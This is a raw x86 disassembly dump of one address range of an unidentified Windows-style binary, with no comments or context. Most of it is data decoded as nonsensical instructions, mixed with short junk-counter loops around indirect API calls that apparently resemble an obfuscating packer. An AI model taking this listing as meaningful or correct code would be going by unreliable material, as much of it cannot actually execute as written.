  409d5e:	cmp    al,0xf2
  409d60:	push   ds
  409d61:	sub    DWORD PTR ds:0xed61c82a,ebp
  409d67:	fsub   QWORD PTR [eax]
  409d69:	push   es
  409d6a:	iret   
  409d6b:	mov    ebp,0x5c8e0823
  409d70:	iret   
  409d71:	jne    0x409d27
  409d73:	dec    ecx
  409d74:	out    dx,al
  409d75:	or     BYTE PTR [esi+0x104f84d1],bh
  409d7b:	test   eax,0xa4ea45b3
  409d80:	jmp    0x608670a
  409d85:	xchg   edi,eax
  409d86:	aaa    
  409d87:	inc    ebx
  409d88:	add    bh,ah
  409d8a:	xor    al,0x0
  409d8c:	add    BYTE PTR [edi],cl
  409d8e:	test   BYTE PTR [eax+eax*1],dl
  409d91:	add    BYTE PTR [eax],al
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43378b
  409d9c:	sub    DWORD PTR ds:0x43385f,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x4337d3,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	sub    bh,BYTE PTR ds:0xe2386473
  409dc4:	jle    0x409e44
  409dc6:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409dca:	add    DWORD PTR [ebp-0x2],ebp
  409dcd:	pusha  
  409dce:	inc    ecx
  409dcf:	pop    eax
  409dd0:	cmp    ah,BYTE PTR [edi+esi*8-0xf]
  409dd4:	data16 jge 0x409e50
  409dd7:	inc    ebp
  409dd8:	aaa    
  409dd9:	fcmovnb st,st(3)
  409ddb:	sbb    ah,BYTE PTR [edx]
  409ddd:	pop    ss
  409dde:	(bad)  
  409ddf:	cmp    al,0x0
  409de1:	mov    bl,cl
  409de3:	push   edi
  409de4:	test   al,0x27
  409de6:	jo     0x409d70
  409de8:	ds mov ecx,0xf2e7b7af
  409dee:	ds aaa 
  409df0:	xchg   ebx,eax
  409df1:	sbb    al,0x27
  409df3:	scas   al,BYTE PTR es:[edi]
  409df4:	in     eax,dx
  409df5:	scas   al,BYTE PTR es:[edi]
  409df6:	test   DWORD PTR [eax],esp
  409df8:	and    bl,ch
  409dfa:	dec    esi
  409dfb:	(bad)  
  409dfc:	aad    0x81
  409dfe:	xlat   BYTE PTR ds:[ebx]
  409dff:	and    esi,DWORD PTR [eax-0xf1063cf]
  409e05:	outs   dx,BYTE PTR ds:[esi]
  409e06:	adc    BYTE PTR [ebx-0x722e6267],ch
  409e0c:	push   esi
  409e0d:	les    ebx,FWORD PTR [esi+0x59]
  409e10:	sub    ah,BYTE PTR [esi+eax*8+0x2d3d40d7]
  409e17:	and    eax,0xf6d606bb
  409e1c:	dec    esp
  409e1d:	test   eax,0xa702ad30
  409e22:	clc    
  409e23:	outs   dx,DWORD PTR ds:[esi]
  409e24:	in     eax,0xbc
  409e26:	arpl   WORD PTR [ebp-0x205cf100],sp
  409e2c:	ret    
  409e2d:	rol    BYTE PTR [eax+0x29],1
  409e30:	je     0x409e6c
  409e32:	out    dx,eax
  409e33:	sbb    al,0xa5
  409e35:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  409e37:	push   ebx
  409e38:	ret    0x4540
  409e3b:	cmp    bl,BYTE PTR [eax+0x5d8f9fd5]
  409e41:	js     0x409eba
  409e43:	mov    ecx,0xeb990cfe
  409e48:	jne    0x409ebe
  409e4a:	pushf  
  409e4b:	in     eax,0xc9
  409e4d:	jg     0x409e67
  409e4f:	push   0x58
  409e51:	inc    ebx
  409e52:	pop    edx
  409e53:	add    edx,DWORD PTR [ebx+0x125f9312]
  409e59:	or     eax,0xe664b387
  409e5e:	adc    al,0x47
  409e60:	push   es
  409e61:	and    al,0x49
  409e63:	or     ebx,eax
  409e65:	dec    ebp
  409e66:	es retf 
  409e68:	ss pushf 
  409e6a:	lahf   
  409e6b:	(bad)  
  409e6c:	jle    0x409e35
  409e6e:	mov    edx,0xb8b40aa6
  409e73:	xor    ah,BYTE PTR [eax+0x2c]
  409e76:	cmp    al,0x50
  409e78:	jmp    0x409e60
  409e7a:	fidiv  DWORD PTR [esi-0x90e599]
  409e80:	jecxz  0x409e18
  409e82:	and    BYTE PTR [edi+0x3e],ch
  409e85:	cmp    eax,0x9d840aac
  409e8a:	and    al,0x26
  409e8c:	xor    cl,BYTE PTR [edi+esi*4]
  409e8f:	jg     0x409ea7
  409e91:	retf   0x8f9a
  409e94:	adc    eax,0x9c4cb1b5
  409e99:	popa   
  409e9a:	fisub  WORD PTR [ebp-0x637ff4b4]
  409ea0:	ja     0x409eb4
  409ea2:	dec    edi
  409ea3:	sbb    esp,edx
  409ea5:	clc    
  409ea6:	rcl    BYTE PTR [ebp-0x4b],0xa4
  409eaa:	and    eax,0x5a6b5569
  409eaf:	jns    0x409e66
  409eb1:	scas   al,BYTE PTR es:[edi]
  409eb2:	fwait
  409eb3:	neg    ecx
  409eb5:	and    edx,edx
  409eb7:	and    ebp,DWORD PTR [ecx-0x4122c10c]
  409ebd:	and    DWORD PTR [edi-0xb],ecx
  409ec0:	or     BYTE PTR ds:0x91fd321c,cl
  409ec6:	jmp    0x409ec9
  409ec8:	or     al,0xee
  409eca:	scas   eax,DWORD PTR es:[edi]
  409ecb:	arpl   WORD PTR [eax],sp
  409ecd:	xchg   ecx,eax
  409ece:	shl    bl,0xb7
  409ed1:	enter  0xdc49,0x65
  409ed5:	repz ret 
  409ed7:	add    BYTE PTR [ecx],dh
  409ed9:	dec    ebp
  409eda:	push   eax
  409edb:	ret    
  409edc:	push   es
  409edd:	inc    ecx
  409ede:	jmp    0xb71a:0x95bc7c48
  409ee5:	adc    al,0xa5
  409ee7:	inc    eax
  409ee8:	cli    
  409ee9:	inc    eax
  409eea:	jge    0x409f5f
  409eec:	xchg   esi,eax
  409eed:	sti    
  409eee:	mov    eax,gs
  409ef0:	sbb    ebp,DWORD PTR [eax+edx*1-0xac17236]
  409ef7:	shr    ebp,1
  409ef9:	cdq    
  409efa:	lea    ebx,[eax-0x5a1ff858]
  409f00:	cwde   
  409f01:	call   0xffdd:0x669c9d67
  409f08:	fcom   DWORD PTR [ebx+ebx*2]
  409f0b:	neg    DWORD PTR [ecx-0x47008082]
  409f11:	call   0x3ff:0x53b4174d
  409f18:	in     eax,dx
  409f19:	mov    edx,DWORD PTR [edx-0x346226bd]
  409f1f:	cmp    eax,0x7f774a24
  409f24:	ins    BYTE PTR es:[edi],dx
  409f25:	lods   al,BYTE PTR ds:[esi]
  409f26:	sti    
  409f27:	sbb    al,0x62
  409f29:	adc    al,BYTE PTR [ecx+0x35]
  409f2c:	in     eax,0x87
  409f2e:	jp     0x409f7e
  409f30:	xchg   ecx,eax
  409f31:	mov    ds:0x4cd89c0c,al
  409f36:	ss xchg esp,eax
  409f38:	out    dx,eax
  409f39:	pop    esp
  409f3a:	xchg   ecx,ebp
  409f3c:	cmp    al,0x6a
  409f3e:	inc    edi
  409f3f:	jmp    0xd9fa301c
  409f44:	cmp    DWORD PTR [edi],0xa9483857
  409f4a:	and    ebp,esi
  409f4c:	scas   eax,DWORD PTR es:[edi]
  409f4d:	mov    dh,0x1
  409f4f:	fdivr  QWORD PTR [ecx+0x70]
  409f52:	test   DWORD PTR [edx],eax
  409f54:	push   edx
  409f55:	inc    edx
  409f56:	cmp    BYTE PTR [ebp+0x49],ah
  409f59:	cmp    bh,bl
  409f5b:	pop    es
  409f5c:	mov    BYTE PTR [esi],bh
  409f5e:	fisttp DWORD PTR [esi-0x56]
  409f61:	sub    DWORD PTR [esi-0x5],ecx
  409f64:	fsubr  QWORD PTR [eax+ebx*8]
  409f67:	stc    
  409f68:	jb     0x409f07
  409f6a:	cmp    DWORD PTR [edi+edx*4-0x76103904],0xffffffb2
  409f72:	mov    al,0xa3
  409f74:	cmp    eax,0x613d1bff
  409f79:	neg    BYTE PTR [ecx]
  409f7b:	bound  ecx,QWORD PTR [ecx-0x4f872371]
  409f81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f82:	inc    edx
  409f83:	enter  0x31d3,0xd0
  409f87:	push   0x5c
  409f89:	inc    ecx
  409f8a:	sbb    cl,BYTE PTR [eax]
  409f8c:	loope  0x409fb0
  409f8e:	(bad)  
  409f8f:	xor    DWORD PTR [edi+0x3e],esi
  409f92:	out    0xc1,eax
  409f94:	pusha  
  409f95:	popf   
  409f96:	clc    
  409f97:	mov    ebx,0xf5cd1ac4
  409f9c:	dec    esi
  409f9d:	jmp    0x1a49bc47
  409fa2:	popf   
  409fa3:	stos   DWORD PTR es:[edi],eax
  409fa4:	fdivr  st(5),st
  409fa6:	fist   DWORD PTR [ebx-0x41]
  409fa9:	call   0x1ee1:0x53c97b6f
  409fb0:	pop    ss
  409fb1:	fidivr DWORD PTR [ebx+0x586f99c4]
  409fb7:	call   0xc632a350
  409fbc:	xor    DWORD PTR [ecx+0x47],0x58
  409fc0:	sub    DWORD PTR [eax],eax
  409fc2:	setno  BYTE PTR [edx-0x34672c5]
  409fc9:	jns    0x409fe3
  409fcb:	dec    esi
  409fcc:	dec    ebx
  409fcd:	inc    edi
  409fce:	jmp    0x40a034
  409fd0:	scas   al,BYTE PTR es:[edi]
  409fd1:	dec    edi
  409fd2:	div    DWORD PTR [eax+0x11]
  409fd5:	and    DWORD PTR [ecx+eiz*1-0x44],edx
  409fd9:	sub    eax,0x779f3c66
  409fde:	mov    al,0x80
  409fe0:	outs   dx,DWORD PTR ds:[esi]
  409fe1:	outs   dx,BYTE PTR ds:[esi]
  409fe2:	ins    DWORD PTR es:[edi],dx
  409fe3:	inc    esi
  409fe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fe5:	xchg   edx,eax
  409fe6:	cs adc al,0x55
  409fe9:	xchg   ecx,eax
  409fea:	xchg   edx,eax
  409feb:	and    BYTE PTR [ebx],al
  409fed:	mov    cl,0xa1
  409fef:	mov    al,ds:0x17ccd04
  409ff4:	jmp    0x8e12:0x63dcacbe
  409ffb:	and    BYTE PTR [edx-0x29],bl
  409ffe:	sub    eax,0x22b6b4a9
  40a003:	stos   DWORD PTR es:[edi],eax
  40a004:	icebp  
  40a005:	imul   edx,esi,0xd60d3f88
  40a00b:	push   cs
  40a00c:	sub    ebp,esi
  40a00e:	imul   ecx,ebp,0xb9d0af0f
  40a014:	jae    0x40a05b
  40a016:	add    BYTE PTR [eax],al
  40a018:	mov    edi,DWORD PTR ds:0x433853
  40a01e:	sbb    DWORD PTR ds:0x43378f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x4337e3,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x4337a3
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x4337db,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x4337db
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x4337db,ecx
  40a059:	cmp    DWORD PTR ds:0x4337db,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x4339be
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x4337db,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43378b,0x11
  40a090:	cmp    DWORD PTR ds:0x43378b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43378b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43378b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43378b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43378b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43378b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43378b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433783,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x4337ef
  40a0f9:	sub    ecx,DWORD PTR ds:0x433793
  40a0ff:	mov    DWORD PTR ds:0x4337ef,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x4337e7,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	mov    al,es:0xe082ab16
  40a12c:	jle    0x40a1ac
  40a12e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a132:	mov    esi,DWORD PTR [esi]
  40a134:	push   0xffffffee
  40a136:	loop   0x40a0c8
  40a138:	sub    esi,edi
  40a13a:	clc    
  40a13b:	or     al,0x44
  40a13d:	rcr    ebx,cl
  40a13f:	ins    DWORD PTR es:[edi],dx
  40a140:	jmp    0x4bcda74e
  40a145:	gs loop 0x40a172
  40a148:	cmp    eax,0x393d6c87
  40a14d:	add    ah,dl
  40a14f:	xchg   ebp,eax
  40a150:	dec    ebp
  40a151:	(bad)  
  40a152:	ss (bad) 
  40a154:	xor    ax,cx
  40a157:	cwde   
  40a158:	dec    ebp
  40a159:	and    DWORD PTR [edx+0x8],eax
  40a15c:	in     al,dx
  40a15d:	cmc    
  40a15e:	jae    0x40a10e
  40a160:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a161:	xchg   esp,eax
  40a162:	sbb    al,0xf5
  40a164:	sbb    al,0xa
  40a166:	adc    bh,BYTE PTR [ecx-0x12]
  40a169:	ins    DWORD PTR es:[edi],dx
  40a16a:	popf   
  40a16b:	sbb    ch,BYTE PTR [edi-0x47]
  40a16e:	inc    ecx
  40a16f:	in     eax,0x20
  40a171:	sub    ch,BYTE PTR [eax+edx*1-0x1e]
  40a175:	test   DWORD PTR [esi],eax
  40a177:	sbb    DWORD PTR [esi],edi
  40a179:	or     bh,dl
  40a17b:	cmp    esp,0xf5bd5d22
  40a181:	ins    BYTE PTR es:[edi],dx
  40a182:	sbb    cl,cl
  40a184:	ins    DWORD PTR es:[edi],dx
  40a185:	mov    gs,WORD PTR [ecx+0x12849a43]
  40a18b:	lock loop 0x40a117
  40a18e:	and    eax,0xa33b8f46
  40a193:	mov    al,ds:0x18d2fd4e
  40a198:	and    esi,edi
  40a19a:	sbb    al,0xf8
  40a19c:	cld    
  40a19d:	test   DWORD PTR [ecx],0x7c011f59
  40a1a3:	fwait
  40a1a4:	pop    ebx
  40a1a5:	or     eax,0x55c886e2
  40a1aa:	imul   ebp,DWORD PTR [esi+0x1c464ba8],0xb38d9804
  40a1b4:	mov    ds:0xd10dd3ad,al
  40a1b9:	inc    edi
  40a1ba:	sbb    edi,eax
  40a1bc:	push   edi
  40a1bd:	push   ds
  40a1be:	sbb    al,0xf8
  40a1c0:	repnz inc edi
  40a1c2:	push   edx
  40a1c3:	lahf   
  40a1c4:	xchg   edx,ecx
  40a1c6:	pop    ebx
  40a1c7:	outs   dx,BYTE PTR ds:[esi]
  40a1c8:	or     eax,0x26c7c359
  40a1cd:	(bad)
  40a1d2:	and    eax,0xdbd8beb
  40a1d7:	std    
  40a1d8:	mov    esi,0xd2b7570f
  40a1dd:	into   
  40a1de:	add    BYTE PTR [esp+eax*1],al
  40a1e1:	mov    edi,0xfad26868
  40a1e6:	mov    ch,0x97
  40a1e8:	in     eax,0x22
  40a1ea:	adc    esp,DWORD PTR [ebp+esi*1-0x739b1dd7]
  40a1f1:	or     DWORD PTR [edx],ebp
  40a1f3:	xchg   ecx,eax
  40a1f4:	aam    0x9f
  40a1f6:	std    
  40a1f7:	js     0x40a251
  40a1f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1fa:	jbe    0x40a22f
  40a1fc:	jmp    0x40a184
  40a1fe:	mov    ds:0x937cce71,al
  40a203:	jge    0x40a191
  40a205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a206:	mov    WORD PTR [edx-0x40],gs
  40a209:	push   esi
  40a20a:	scas   eax,DWORD PTR es:[edi]
  40a20b:	push   ss
  40a20c:	test   al,0xe7
  40a20e:	jmp    0xb78ab003
  40a213:	fwait
  40a214:	mov    BYTE PTR [ebx-0x5bec7bdf],0x5a
  40a21b:	(bad)  
  40a21c:	dec    eax
  40a21d:	test   BYTE PTR [ebx],al
  40a21f:	lea    eax,[ecx-0x7f]
  40a222:	sub    eax,0x8ce9bbaa
  40a227:	or     al,0xfd
  40a229:	popa   
  40a22a:	std    
  40a22b:	jl     0x40a226
  40a22d:	sti    
  40a22e:	mov    ds:0xe622ad3f,al
  40a233:	daa    
  40a234:	daa    
  40a235:	lahf   
  40a236:	and    eax,0x597664ff
  40a23b:	push   ds
  40a23c:	mov    dh,0x70
  40a23e:	aaa    
  40a23f:	sub    eax,0xece5ec31
  40a244:	add    ah,BYTE PTR [edx-0x66]
  40a247:	shl    DWORD PTR [edi],0xfe
  40a24a:	mov    esi,DWORD PTR [edx+0x38]
  40a24d:	mov    ah,0xf3
  40a24f:	stos   BYTE PTR es:[edi],al
  40a250:	out    dx,al
  40a251:	aas    
  40a252:	add    dh,BYTE PTR [ebx]
  40a254:	(bad)  
  40a255:	cld    
  40a256:	inc    edx
  40a257:	sbb    dh,BYTE PTR [edi-0x2c9287e5]
  40a25d:	outs   dx,DWORD PTR ds:[esi]
  40a25e:	loope  0x40a2bf
  40a260:	mov    bl,0x15
  40a262:	(bad)  
  40a263:	jbe    0x40a259
  40a265:	jmp    0x7c3cac0e
  40a26a:	test   eax,0x3d46ad91
  40a26f:	iret   
  40a270:	cdq    
  40a271:	add    BYTE PTR [ecx-0x29e40adc],dl
  40a277:	fldenv [eax]
  40a279:	addr16 pop ds
  40a27b:	scas   eax,DWORD PTR es:[edi]
  40a27c:	(bad)  
  40a27d:	jge    0x40a22a
  40a27f:	jmp    0x40a2d4
  40a281:	aaa    
  40a282:	cmp    cl,BYTE PTR ds:0xc70c84da
  40a288:	xchg   DWORD PTR [esi],esp
  40a28a:	adc    DWORD PTR [ebp-0x46],eax
  40a28d:	sub    BYTE PTR [edi-0x30],ah
  40a290:	mov    bh,0xc3
  40a292:	out    dx,eax
  40a293:	scas   eax,DWORD PTR es:[edi]
  40a294:	sbb    DWORD PTR [esi],ecx
  40a296:	jg     0x40a22c
  40a298:	xor    DWORD PTR [ecx+0x2e],edi
  40a29b:	jmp    0xc16e5e1
  40a2a0:	arpl   WORD PTR [edx+0x40b03177],ax
  40a2a6:	dec    ecx
  40a2a7:	mov    al,ds:0x108b0905
  40a2ac:	jmp    0x87c6:0xd2314b01
  40a2b3:	push   esi
  40a2b4:	pop    ecx
  40a2b5:	nop
  40a2b6:	(bad)  
  40a2b7:	jne    0x40a27d
  40a2b9:	pusha  
  40a2ba:	lods   al,BYTE PTR ds:[esi]
  40a2bb:	imul   ebx,DWORD PTR ds:0xc4986a14,0x88f8111e
  40a2c5:	xchg   BYTE PTR [esi+0xc11cc88],bh
  40a2cb:	push   esi
  40a2cc:	daa    
  40a2cd:	push   ecx
  40a2ce:	add    BYTE PTR [ebp-0x4ea8b4bf],0xa8
  40a2d5:	mov    ch,0xdd
  40a2d7:	push   cs
  40a2d8:	mov    ecx,DWORD PTR [ecx]
  40a2da:	xor    al,bh
  40a2dc:	aam    0x98
  40a2de:	inc    ebp
  40a2df:	daa    
  40a2e0:	jnp    0x40a283
  40a2e2:	mov    ds,WORD PTR [ebp+0x6eb87021]
  40a2e8:	int3   
  40a2e9:	int    0x73
  40a2eb:	mov    BYTE PTR [eax+edi*2+0x53],ch
  40a2ef:	repnz dec ebx
  40a2f1:	adc    eax,0x55530867
  40a2f6:	xchg   edi,eax
  40a2f7:	fs pop ebx
  40a2f9:	and    ecx,ebx
  40a2fb:	stc    
  40a2fc:	sub    esp,DWORD PTR [esi-0x67c2c359]
  40a302:	mov    dh,0x1a
  40a304:	outs   dx,DWORD PTR ds:[esi]
  40a305:	out    0x26,eax
  40a307:	int3   
  40a308:	icebp  
  40a309:	(bad)  
  40a30a:	test   BYTE PTR [esi+0x1a],0xe5
  40a30e:	jl     0x40a325
  40a310:	pop    ds
  40a311:	sar    BYTE PTR [edi],cl
  40a313:	pop    es
  40a314:	popa   
  40a315:	mov    WORD PTR [ebp+0x56],es
  40a318:	pop    ss
  40a319:	mov    ebx,0x4061cd5f
  40a31e:	dec    edi
  40a31f:	in     al,dx
  40a320:	dec    esi
  40a321:	sti    
  40a322:	ja     0x40a36c
  40a324:	fbstp  TBYTE PTR [ebx-0x42]
  40a327:	cmp    bl,BYTE PTR [ebp-0x3d]
  40a32a:	leave  
  40a32b:	jb     0x40a378
  40a32d:	pop    eax
  40a32e:	sbb    al,cl
  40a330:	pop    ecx
  40a331:	push   es
  40a332:	jecxz  0x40a38d
  40a334:	sub    eax,DWORD PTR ds:0xd20f3981
  40a33a:	cs sbb eax,0x6db6754f
  40a340:	sbb    ah,bl
  40a342:	mov    al,0xeb
  40a344:	mov    esi,0x32f694e8
  40a349:	push   edi
  40a34a:	fwait
  40a34b:	mov    dh,BYTE PTR [edi-0x22b00f4e]
  40a351:	adc    DWORD PTR [edi+0x5e],ecx
  40a354:	inc    edx
  40a355:	das    
  40a356:	ret    0x623f
  40a359:	fldenv [ebp+0x77]
  40a35c:	shr    DWORD PTR [ecx],cl
  40a35e:	sub    eax,0x16d41826
  40a363:	mov    ds:0x5076a56e,eax
  40a368:	ds test al,0xf1
  40a36b:	or     eax,0xbcfa4686
  40a371:	into   
  40a372:	sub    eax,0x633a6d78
  40a377:	or     DWORD PTR [ebx-0x37cc17b3],0xffffff81
  40a37e:	and    eax,0x43377b
  40a383:	add    BYTE PTR [eax],al
  40a385:	add    BYTE PTR [eax],al
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x43377b
  40a394:	inc    eax
  40a395:	mov    ds:0x43377b,eax
  40a39a:	cmp    DWORD PTR ds:0x43377b,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x43377b,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x43386f
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x4337eb
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x4337e7,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x4337e7,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x4337e7,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433817
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x4337e7,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x4337e7
  40a434:	dec    eax
  40a435:	mov    ds:0x4337e7,eax
  40a43a:	mov    eax,ds:0x4337e7
  40a43f:	dec    eax
  40a440:	mov    ds:0x4337e7,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43379f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x4338af
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x4338a3,0x433827
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433787,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	sub    BYTE PTR [esi-0x69],bh
  40a49e:	or     DWORD PTR [esi+ebp*8+0x7e],0x7e
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	std    
  40a4a8:	call   0x24cb4cc9
  40a4ad:	fisttp WORD PTR [edi-0x1430d193]
  40a4b3:	ss jecxz 0x40a441
  40a4b6:	add    ebx,esi
  40a4b8:	jl     0x40a510
  40a4ba:	(bad)  
  40a4bb:	cmp    ch,BYTE PTR [edx-0x10]
  40a4be:	mov    cl,0x4e
  40a4c0:	push   esi
  40a4c1:	cmp    cl,dh
  40a4c3:	test   al,0x5a
  40a4c5:	jmp    0xc291:0x95016a7e
  40a4cc:	data16 mov al,0x80
  40a4cf:	dec    esp
  40a4d0:	jno    0x40a522
  40a4d2:	(bad)  
  40a4d3:	pop    DWORD PTR [esi+0x43]
  40a4d6:	jno    0x40a494
  40a4d8:	pop    esi
  40a4d9:	xchg   esi,eax
  40a4da:	in     eax,0x7
  40a4dc:	ja     0x40a4b3
  40a4de:	lea    ecx,[esi+edi*1-0x5346c5ff]
  40a4e5:	cli    
  40a4e6:	(bad)  
  40a4e7:	rcr    dl,1
  40a4e9:	or     BYTE PTR [edi+0x59],dl
  40a4ec:	dec    esi
  40a4ed:	and    dl,BYTE PTR [ebx]
  40a4ef:	mov    esp,0xd6a8415e
  40a4f4:	push   esi
  40a4f5:	(bad)  
  40a4f6:	aaa    
  40a4f7:	fstp   DWORD PTR [edx]
  40a4f9:	(bad)  
  40a4fa:	das    
  40a4fb:	clc    
  40a4fc:	pop    ebx
  40a4fd:	(bad)  
  40a4fe:	aam    0xe5
  40a500:	jle    0x40a499
  40a502:	mov    ds:0xaf0e08b7,eax
  40a507:	mov    DWORD PTR [eax-0x6f],esi
  40a50a:	pop    esi
  40a50b:	scas   al,BYTE PTR es:[edi]
  40a50c:	outs   dx,DWORD PTR ds:[esi]
  40a50d:	push   eax
  40a50e:	mov    esp,ecx
  40a510:	xchg   esi,eax
  40a511:	lds    ecx,FWORD PTR ds:0xf777975a
  40a517:	push   ebp
  40a518:	and    bh,BYTE PTR [esi+edx*8+0x51]
  40a51c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a51d:	and    dh,BYTE PTR [esi]
  40a51f:	xor    DWORD PTR [ebx-0x36],eax
  40a522:	mov    ds:0x9ea68bcd,eax
  40a527:	xchg   BYTE PTR [esi+0x53460fda],dh
  40a52d:	scas   eax,DWORD PTR es:[edi]
  40a52e:	xor    DWORD PTR ds:0x28bd8ded,ebp
  40a534:	xchg   ecx,eax
  40a535:	aaa    
  40a536:	push   ss
  40a537:	dec    cl
  40a539:	fwait
  40a53a:	std    
  40a53b:	dec    esi
  40a53c:	mov    ds:0x388b2988,eax
  40a541:	test   al,0xbc
  40a543:	fdivr  QWORD PTR ds:0x5c16f321
  40a549:	inc    ecx
  40a54a:	lahf   
  40a54b:	jl     0x40a4e7
  40a54d:	out    0x2e,eax
  40a54f:	test   DWORD PTR [eax],ecx
  40a551:	lods   al,BYTE PTR ds:[esi]
  40a552:	dec    ebp
  40a553:	bound  edx,QWORD PTR [eax+0x2f6aaf77]
  40a559:	or     eax,0xad7503aa
  40a55e:	shr    ebx,0x5a
  40a561:	sbb    DWORD PTR [esi+0x9a4b897],edx
  40a567:	clc    
  40a568:	sbb    al,0xb8
  40a56a:	and    BYTE PTR [ebp-0x25],dl
  40a56d:	mov    ebp,0x343a99d8
  40a572:	pop    edi
  40a573:	pop    edi
  40a574:	mov    eax,0x7512d108
  40a579:	push   cs
  40a57a:	dec    ebx
  40a57b:	jnp    0x40a5d8
  40a57d:	imul   ebp,edi,0x7951f4c3
  40a583:	lock or al,0xbd
  40a586:	popa   
  40a587:	test   BYTE PTR [ebp-0x26d926ba],0x9a
  40a58e:	jmp    DWORD PTR [ebx+0x4f782d28]
  40a594:	js     0x40a614
  40a596:	lock sub esp,DWORD PTR [edi]
  40a599:	ja     0x40a5eb
  40a59b:	xchg   BYTE PTR [esi+0x7a4432e],al
  40a5a1:	popa   
  40a5a2:	pop    edi
  40a5a3:	shr    ch,cl
  40a5a5:	cmp    al,0xf3
  40a5a7:	xor    ebp,DWORD PTR [edx+0x5]
  40a5aa:	jno    0x40a5c5
  40a5ac:	imul   ecx,DWORD PTR [eax-0x14cf153c],0x14598087
  40a5b6:	jne    0x40a5ba
  40a5b8:	inc    edx
  40a5b9:	xor    eax,0x2e741b31
  40a5be:	xchg   esp,eax
  40a5bf:	in     al,dx
  40a5c0:	fcomp  st(5)
  40a5c2:	icebp  
  40a5c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5c4:	sbb    bh,BYTE PTR [edi]
